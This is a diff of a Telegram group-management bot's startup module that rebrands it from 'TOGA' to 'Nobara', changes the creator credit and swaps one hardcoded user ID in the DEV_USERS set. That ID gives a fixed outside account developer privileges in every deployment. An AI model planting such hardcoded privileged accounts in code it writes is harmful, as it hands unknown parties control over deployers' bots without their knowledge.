@@ -23,8 +23,8 @@ logging.basicConfig(
               logging.StreamHandler()],
     level=logging.INFO)
 
-LOGGER = logging.getLogger("[TOGA]")
-LOGGER.info("CREATED BY: KAC-CHAN (t.me/PervertSenpai)")
+LOGGER = logging.getLogger("[Nobara]")
+LOGGER.info("CREATED BY: U N K N O W N (t.me/XtheAnonymous)")
 
 log = logging.getLogger('[Your Bot Is DEPLOYING]')
 
@@ -220,7 +220,7 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(5163444566)
+DEV_USERS.add(2065590380)
 
 if not SPAMWATCH_API:
     sw = None
@@ -281,7 +281,7 @@ BOT_NAME = bottie.first_name
 BOT_MENTION = bottie.mention
 
 print(
-    "[TOGA] TOGA Is Starting."
+    "[Nobara] Nobara Is Starting."
 )
 
 REDIS = StrictRedis.from_url(REDIS_URL, decode_responses=True)
@@ -290,7 +290,7 @@ try:
 
     REDIS.ping()
 
-    LOGGER.info("[TOGA]:Connecting To Redis Database")
+    LOGGER.info("[Nobara]:Connecting To Redis Database")
 
 except BaseException:
 
@@ -301,10 +301,10 @@ finally:
    REDIS.ping()
 
 print(
-    "[TOGA] SERVERS Connected SUCCESSFULLY!!"
+    "[Nobara] SERVERS Connected SUCCESSFULLY!!"
 )
 print(
-    "[TOGA] INITIALIZING MODULES ERROR!!"
+    "[Nobara] INITIALIZING MODULES ERROR!!"
 )
 
 quotly = Quotly()
